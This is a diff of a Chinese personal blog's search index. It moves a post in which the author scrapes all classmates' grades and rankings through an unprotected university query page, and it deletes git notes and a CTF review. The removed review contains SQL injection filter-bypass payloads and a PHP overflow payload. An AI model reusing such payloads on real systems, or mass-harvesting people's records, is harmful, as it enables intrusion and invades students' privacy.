-<h2 id="版本管理"><a href="#版本管理" class="headerlink" title="版本管理"></a>版本管理</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log 显示从最近到最远的提交日志 --pretty&#x3D;oneline参数精简显示</span><br><span class="line"></span><br><span class="line">git reset --hard HEAD^ 回退到上个版本，HEAD表示当前版本</span><br><span class="line"></span><br><span class="line">git reset --hard &lt;commit id&gt; 回退到指定版本</span><br><span class="line"></span><br><span class="line">git reflog 记录每次指令，包括commit id</span><br><span class="line"></span><br><span class="line">git checkout -- &lt;file&gt; 丢弃工作区修改，用版本库里的版本替换工作区的版本</span><br><span class="line"></span><br><span class="line">git reset HEAD &lt;file&gt; 将暂存区修改撤销并放回工作区</span><br><span class="line"></span><br><span class="line">git rm &lt;file&gt; 工作区删除后需要rm(add)和commit</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    <title>一次爬虫实战</title>
+    <url>/posts/5a85636c/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近迷上了python，各种花里胡哨的库也太好玩了。</p>
+<p>今天导员发了个查成绩的通知，外加了链接，一个很简单的网页，输入学号姓名就能查，闲来无事就把所有人的全爬下来了，外加做了一波分析（狗头）</p>
+<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>很简单的一个网页</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210923231120.png"></p>
+<p>先抓包分析，发现post的有用的就真的只有个学号姓名，连个前端加密都没有，直接构造就行。</p>
+<p>现学了execel文件读写，用菜的扣脚的beautifulsoup把网页信息提取出来了，很简单。</p>
+<p>而且网站连个反爬都没有，直接请求了好几百次都没限制，无语。</p>
+<p><strong>代码如下，已去除关键信息，仅供学习！</strong></p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> xlsxwriter <span class="keyword">as</span> xw</span><br><span class="line"></span><br><span class="line">stu = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getScores</span>(<span class="params">name,<span class="built_in">id</span></span>):</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;187&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">r&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;time&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;vale0&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;uale0&#x27;</span>:<span class="string">&#x27;学号&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sfzh0&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;vale1&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;uale1&#x27;</span>:<span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sfzh1&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;iiii&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tips&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tits&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;button&#x27;</span>:<span class="string">&#x27;立即查询&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        soup = BeautifulSoup(res.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        _count = soup.select(<span class="string">&#x27;td[data-label=&quot;门数&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _scores = soup.select(<span class="string">&#x27;td[data-label=&quot;学分加权平均分&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _rank = soup.select(<span class="string">&#x27;td[data-label=&quot;学分加权平均分排名&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _major = soup.select(<span class="string">&#x27;td[data-label=&quot;专业&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _class = soup.select(<span class="string">&#x27;td[data-label=&quot;班级&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        tmp = &#123;<span class="string">&#x27;1&#x27;</span>: name, <span class="string">&#x27;2&#x27;</span>: <span class="built_in">id</span>, <span class="string">&#x27;3&#x27;</span>: _count, <span class="string">&#x27;4&#x27;</span>: _scores, <span class="string">&#x27;5&#x27;</span>: _rank, <span class="string">&#x27;6&#x27;</span>: _major, <span class="string">&#x27;7&#x27;</span>: _class&#125;</span><br><span class="line">        stu.append(tmp)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xw_toExcel</span>(<span class="params">data, fileName</span>):</span>  </span><br><span class="line">    workbook = xw.Workbook(fileName)  </span><br><span class="line">    worksheet1 = workbook.add_worksheet(<span class="string">&quot;sheet1&quot;</span>) </span><br><span class="line">    worksheet1.activate()  </span><br><span class="line">    title = [<span class="string">&#x27;姓名&#x27;</span>, <span class="string">&#x27;学号&#x27;</span>, <span class="string">&#x27;门数&#x27;</span>, <span class="string">&#x27;学分加权平均分&#x27;</span>, <span class="string">&#x27;学分加权平均分排名&#x27;</span>, <span class="string">&#x27;专业&#x27;</span>, <span class="string">&#x27;班级&#x27;</span>]</span><br><span class="line">    worksheet1.write_row(<span class="string">&#x27;A1&#x27;</span>, title) </span><br><span class="line">    i = <span class="number">2</span>  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        insertData = [data[j][<span class="string">&quot;1&quot;</span>], data[j][<span class="string">&quot;2&quot;</span>], data[j][<span class="string">&quot;3&quot;</span>], data[j][<span class="string">&quot;4&quot;</span>], data[j][<span class="string">&quot;5&quot;</span>], data[j][<span class="string">&quot;6&quot;</span>], data[j][<span class="string">&quot;7&quot;</span>]]</span><br><span class="line">        row = <span class="string">&#x27;A&#x27;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">        worksheet1.write_row(row, insertData)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    workbook.close() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">excel_path = <span class="string">&#x27;./stu.xlsx&#x27;</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">excel = xlrd.open_workbook(excel_path,encoding_override=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">sheet = excel.sheets()[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line">sheet_row_mount = sheet.nrows</span><br><span class="line">sheet_col_mount = sheet.ncols</span><br><span class="line"></span><br><span class="line">name = sheet.col_values(<span class="number">2</span>) </span><br><span class="line"><span class="built_in">id</span> = sheet.col_values(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>():</span><br><span class="line">    getScores(name[i], <span class="built_in">id</span>[i])</span><br><span class="line"></span><br><span class="line">fileName = <span class="string">&#x27;scores.xlsx&#x27;</span></span><br><span class="line">xw_toExcel(stu, fileName)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin master 把本地master分支的最新修改推送至GitHub</span><br><span class="line"></span><br><span class="line">git remote -v 查看远程库信息</span><br><span class="line"></span><br><span class="line">git remote rm origin 解除绑定</span><br><span class="line"></span><br><span class="line">git clone git@github.com:XXX&#x2F;XXX.git clone本地库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><h3 id="创建与合并分支"><a href="#创建与合并分支" class="headerlink" title="创建与合并分支"></a>创建与合并分支</h3><p>一开始的时候，master分支是一条线，Git用master指向最新的提交，再用HEAD指向master，就能确定当前分支，以及当前分支的提交点：</p>
-<p><img src="https://static.liaoxuefeng.com/files/attachments/919022325462368/0"></p>
-<p>当我们创建新的分支，例如dev时，Git新建了一个指针叫dev，指向master相同的提交，再把HEAD指向dev，就表示当前分支在dev上：</p>
-<p><img src="https://www.liaoxuefeng.com/files/attachments/919022363210080/l"></p>
-<p>不过，从现在开始，对工作区的修改和提交就是针对dev分支了，比如新提交一次后，dev指针往前移动一步，而master指针不变：</p>
-<p><img src="https://www.liaoxuefeng.com/files/attachments/919022387118368/l"></p>
-<p>假如我们在dev上的工作完成了，就可以把dev合并到master上。Git怎么合并呢？最简单的方法，就是直接把master指向dev的当前提交，就完成了合并：</p>
-<p><img src="https://www.liaoxuefeng.com/files/attachments/919022412005504/0"></p>
-<p>合并完分支后，甚至可以删除dev分支。删除dev分支就是把dev指针给删掉，删掉后，我们就剩下了一条master分支：</p>
-<p><img src="https://www.liaoxuefeng.com/files/attachments/919022479428512/0"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b &lt;dev&gt; 创建并切换分支到dev</span><br><span class="line"></span><br><span class="line">git branch &lt;name&gt; 创建分支</span><br><span class="line"></span><br><span class="line">git checkout &lt;name&gt; 切换分支</span><br><span class="line"></span><br><span class="line">git branch 查看当前分支</span><br><span class="line"></span><br><span class="line">git merge &lt;dev&gt; 将dev分支上的内容合并到master分支</span><br><span class="line"></span><br><span class="line">git branch -d &lt;dev&gt; 删除dev分支</span><br><span class="line"></span><br><span class="line">新特性switch</span><br><span class="line"></span><br><span class="line">git switch -c &lt;dev&gt; 创建并切换分支到dev</span><br><span class="line"></span><br><span class="line">git switch &lt;dev&gt; 切换分支</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="冲突解决"><a href="#冲突解决" class="headerlink" title="冲突解决"></a>冲突解决</h3><p>当Git无法自动合并分支时，就必须首先解决冲突。解决冲突后，再提交，合并完成。</p>
-<p>解决冲突就是把Git合并失败的文件手动编辑为我们希望的内容，再提交。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git status 查看冲突文件</span><br><span class="line">git log --graph --pretty&#x3D;oneline --abbrev-commit 查看分支合并图</span><br></pre></td></tr></table></figure>
-
-<h3 id="分支管理策略"><a href="#分支管理策略" class="headerlink" title="分支管理策略"></a>分支管理策略</h3><p>在实际开发中，我们应该按照几个基本原则进行分支管理：</p>
-<p>首先，master分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；</p>
-<p>那在哪干活呢？干活都在dev分支上，也就是说，dev分支是不稳定的，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，在master分支发布1.0版本；</p>
-<p>你和你的小伙伴们每个人都在dev分支上干活，每个人都有自己的分支，时不时地往dev分支上合并就可以了。</p>
-<p>所以，团队合作的分支看起来就像这样：</p>
-<p><img src="https://www.liaoxuefeng.com/files/attachments/919023260793600/0"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git merge --no-ff -m &quot;message&quot; &lt;dev&gt; 禁用Fast forward</span><br></pre></td></tr></table></figure>
-<h3 id="bug分支"><a href="#bug分支" class="headerlink" title="bug分支"></a>bug分支</h3><p>修复bug时，我们会通过创建新的bug分支进行修复，然后合并，最后删除；</p>
-<p>当手头工作没有完成时，先把工作现场git stash一下，然后去修复bug，修复后，再git stash pop，回到工作现场；</p>
-<p>在master分支上修复的bug，想要合并到当前dev分支，可以用git cherry-pick <commit id>命令，把bug提交的修改“复制”到当前分支，避免重复劳动。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git stash list 查看工作现场</span><br><span class="line"></span><br><span class="line">git stash apply 恢复现场</span><br><span class="line"></span><br><span class="line">git stash drop 删除现场</span><br><span class="line"></span><br><span class="line">git stash pop 恢复并删除现场</span><br></pre></td></tr></table></figure>
-
-<h3 id="feature分支"><a href="#feature分支" class="headerlink" title="feature分支"></a>feature分支</h3><p>开发一个新feature，最好新建一个分支；</p>
-<p>如果要丢弃一个没有被合并过的分支，可以通过git branch -D <name>强行删除。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git branch -D &lt;name&gt; 强行删除未合并分支</span><br></pre></td></tr></table></figure>
-
-<h3 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h3><h4 id="推送分支"><a href="#推送分支" class="headerlink" title="推送分支"></a>推送分支</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin master 推送主分支</span><br><span class="line"></span><br><span class="line">git push origin dev 推送dev分支</span><br></pre></td></tr></table></figure>
-
-<h4 id="抓取分支"><a href="#抓取分支" class="headerlink" title="抓取分支"></a>抓取分支</h4><p>查看远程库信息，使用git remote -v；</p>
-<p>本地新建的分支如果不推送到远程，对其他人就是不可见的；</p>
-<p>从本地推送分支，使用git push origin branch-name，如果推送失败，先用git pull抓取远程的新提交；</p>
-<p>在本地创建和远程分支对应的分支，使用git checkout -b branch-name origin/branch-name，本地和远程分支的名称最好一致；</p>
-<p>建立本地分支和远程分支的关联，使用git branch –set-upstream branch-name origin/branch-name；</p>
-<p>从远程抓取分支，使用git pull，如果有冲突，要先处理冲突。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b dev origin&#x2F;dev 创建远程origin的dev分支到本地</span><br><span class="line"></span><br><span class="line">git pull 抓取最新提交并合并冲突</span><br><span class="line"></span><br><span class="line">git branch --set-upstream-to&#x3D;origin&#x2F;dev dev 链接本地分支与远程分支</span><br></pre></td></tr></table></figure>
-
-<h3 id="rebase"><a href="#rebase" class="headerlink" title="rebase"></a>rebase</h3><p>rebase操作可以把本地未push的分叉提交历史整理成直线；</p>
-<p>rebase的目的是使得我们在查看历史提交的变化时更容易，因为分叉的提交需要三方对比。</p>
-<h3 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h3><p>标签是版本库的一个快照</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git tag 查看所有标签</span><br><span class="line"></span><br><span class="line">git tag &lt;tagname&gt; &lt;commit id&gt;</span><br><span class="line"></span><br><span class="line">git tag -a &lt;tagname&gt; -m &quot;message&quot; 指定标签信息命令</span><br><span class="line"></span><br><span class="line">git tag -s &lt;tagname&gt; -m &quot;message&quot; PGP签名标签命令</span><br><span class="line"></span><br><span class="line">git show &lt;tagname&gt; 查看标签信息</span><br><span class="line"></span><br><span class="line">git tag -d &lt;tagname&gt; 删除一个本地标签</span><br><span class="line"></span><br><span class="line">git push origin :refs&#x2F;tags&#x2F;&lt;tagname&gt; 删除一个远程标签</span><br><span class="line"></span><br><span class="line">git push origin &lt;tagname&gt; 推送一个本地标签</span><br><span class="line"></span><br><span class="line">git push origin --tags 推送全部未推送过的本地标签</span><br></pre></td></tr></table></figure>]]></content>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>python只是用来娱乐，生产力还得是c++!</p>
+]]></content>
       <categories>
-        <category>开发工具</category>
+        <category>python实践</category>
       </categories>
       <tags>
-        <tag>git</tag>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -1526,109 +1564,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
-    <title>一次爬虫实战</title>
-    <url>/posts/5a85636c/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近迷上了python，各种花里胡哨的库也太好玩了。</p>
-<p>今天导员发了个查成绩的通知，外加了链接，一个很简单的网页，输入学号姓名就能查，闲来无事就把所有人的全爬下来了，外加做了一波分析（狗头）</p>
-<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>很简单的一个网页</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210923231120.png"></p>
-<p>先抓包分析，发现post的有用的就真的只有个学号姓名，连个前端加密都没有，直接构造就行。</p>
-<p>现学了execel文件读写，用菜的扣脚的beautifulsoup把网页信息提取出来了，很简单。</p>
-<p>而且网站连个反爬都没有，直接请求了好几百次都没限制，无语。</p>
-<p><strong>代码如下，已去除关键信息，仅供学习！</strong></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> xlsxwriter <span class="keyword">as</span> xw</span><br><span class="line"></span><br><span class="line">stu = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getScores</span>(<span class="params">name,<span class="built_in">id</span></span>):</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;187&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">r&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;time&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;vale0&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;uale0&#x27;</span>:<span class="string">&#x27;学号&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sfzh0&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;vale1&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;uale1&#x27;</span>:<span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sfzh1&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;iiii&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tips&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tits&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;button&#x27;</span>:<span class="string">&#x27;立即查询&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        soup = BeautifulSoup(res.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        _count = soup.select(<span class="string">&#x27;td[data-label=&quot;门数&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _scores = soup.select(<span class="string">&#x27;td[data-label=&quot;学分加权平均分&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _rank = soup.select(<span class="string">&#x27;td[data-label=&quot;学分加权平均分排名&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _major = soup.select(<span class="string">&#x27;td[data-label=&quot;专业&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _class = soup.select(<span class="string">&#x27;td[data-label=&quot;班级&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        tmp = &#123;<span class="string">&#x27;1&#x27;</span>: name, <span class="string">&#x27;2&#x27;</span>: <span class="built_in">id</span>, <span class="string">&#x27;3&#x27;</span>: _count, <span class="string">&#x27;4&#x27;</span>: _scores, <span class="string">&#x27;5&#x27;</span>: _rank, <span class="string">&#x27;6&#x27;</span>: _major, <span class="string">&#x27;7&#x27;</span>: _class&#125;</span><br><span class="line">        stu.append(tmp)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xw_toExcel</span>(<span class="params">data, fileName</span>):</span>  </span><br><span class="line">    workbook = xw.Workbook(fileName)  </span><br><span class="line">    worksheet1 = workbook.add_worksheet(<span class="string">&quot;sheet1&quot;</span>) </span><br><span class="line">    worksheet1.activate()  </span><br><span class="line">    title = [<span class="string">&#x27;姓名&#x27;</span>, <span class="string">&#x27;学号&#x27;</span>, <span class="string">&#x27;门数&#x27;</span>, <span class="string">&#x27;学分加权平均分&#x27;</span>, <span class="string">&#x27;学分加权平均分排名&#x27;</span>, <span class="string">&#x27;专业&#x27;</span>, <span class="string">&#x27;班级&#x27;</span>]</span><br><span class="line">    worksheet1.write_row(<span class="string">&#x27;A1&#x27;</span>, title) </span><br><span class="line">    i = <span class="number">2</span>  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        insertData = [data[j][<span class="string">&quot;1&quot;</span>], data[j][<span class="string">&quot;2&quot;</span>], data[j][<span class="string">&quot;3&quot;</span>], data[j][<span class="string">&quot;4&quot;</span>], data[j][<span class="string">&quot;5&quot;</span>], data[j][<span class="string">&quot;6&quot;</span>], data[j][<span class="string">&quot;7&quot;</span>]]</span><br><span class="line">        row = <span class="string">&#x27;A&#x27;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">        worksheet1.write_row(row, insertData)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    workbook.close() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">excel_path = <span class="string">&#x27;./stu.xlsx&#x27;</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">excel = xlrd.open_workbook(excel_path,encoding_override=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">sheet = excel.sheets()[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line">sheet_row_mount = sheet.nrows</span><br><span class="line">sheet_col_mount = sheet.ncols</span><br><span class="line"></span><br><span class="line">name = sheet.col_values(<span class="number">2</span>) </span><br><span class="line"><span class="built_in">id</span> = sheet.col_values(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>():</span><br><span class="line">    getScores(name[i], <span class="built_in">id</span>[i])</span><br><span class="line"></span><br><span class="line">fileName = <span class="string">&#x27;scores.xlsx&#x27;</span></span><br><span class="line">xw_toExcel(stu, fileName)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>python只是用来娱乐，生产力还得是c++!</p>
-]]></content>
-      <categories>
-        <category>python实践</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初夏赛复盘</title>
-    <url>/posts/63fc7f18/</url>
-    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql_inject"></a>sql_inject</h2><blockquote>
-<p>过滤绕过</p>
-</blockquote>
-<p>|| 代替 or</p>
-<p>!(a&lt;&gt;a) 代替 =</p>
-<p>/**/ 代替 空格</p>
-<p>mid 代替 left right substr</p>
-<p>3’/<strong>/||/</strong>/!(1&lt;&gt;1)#</p>
-<p>3’/<strong>/||/</strong>/!(database()&lt;&gt;’cumtctf’)#</p>
-<p>1’/<strong>/||/</strong>/!(mid((select/<strong>/group_concat(table_name)/</strong>/from/<strong>/mysql.innodb_table_stats/</strong>/where/**/!(database_name&lt;&gt;’cumtctf’)),1,1)&lt;&gt;’f’)#;</p>
-<p>1’/<strong>/||/</strong>/!(mid((select/<strong>/group_concat(table_name)/</strong>/from/<strong>/mysql.innodb_table_stats/</strong>/where/**/!(database_name&lt;&gt;’cumtctf’)),1,34)&lt;&gt;’flag_table,no_use_table,test,users’)#;</p>
-<p>无列名注入这个有点离谱<br>直接把flag给试出来了？？？</p>
-<p>1’/<strong>/||/</strong>/(select/<strong>/(‘flag{cumtctf_sql_is_s0_e@sy}’,0)&gt;(select/</strong>/*/<strong>/from/</strong>/flag_table/<strong>/limit/</strong>/1,1));#</p>
-<h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>php在64位系统中，当索引大小为9223372036854775808会溢出</p>
-<pre><code>payload:web=flag&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806
-</code></pre>
-<p>jphide:</p>
-<p>这个有GUI界面不用命令输入密码就行。</p>
-<h2 id="RCE-Me"><a href="#RCE-Me" class="headerlink" title="RCE_Me"></a>RCE_Me</h2>]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>sql注入</tag>
-        <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>中国矿业大学正方教务爬虫</title>
-    <url>/posts/6f73e94e/</url>
-    <content><![CDATA[<h1 id="中国矿业大学正方教务爬虫"><a href="#中国矿业大学正方教务爬虫" class="headerlink" title="中国矿业大学正方教务爬虫"></a>中国矿业大学正方教务爬虫</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>项目地址：</strong></p>
-<p><a href="https://github.com/Haorical/CUMT-jwxt">https://github.com/Haorical/CUMT-jwxt</a></p>
-<p>配置好后直接运行main.py就可以体验爬取成绩的功能，代码可读性良好，适合二次开发。</p>
-<p>本着服务抗大学子的宗旨，写了这个教务爬虫，用来练手，应该会开发一段时间，目前只<br>实现了模拟登录和爬取成绩，万众瞩目的自动抢课功能由于当前没有开放选课，暂时无法<br>开发，暂时搁置。</p>
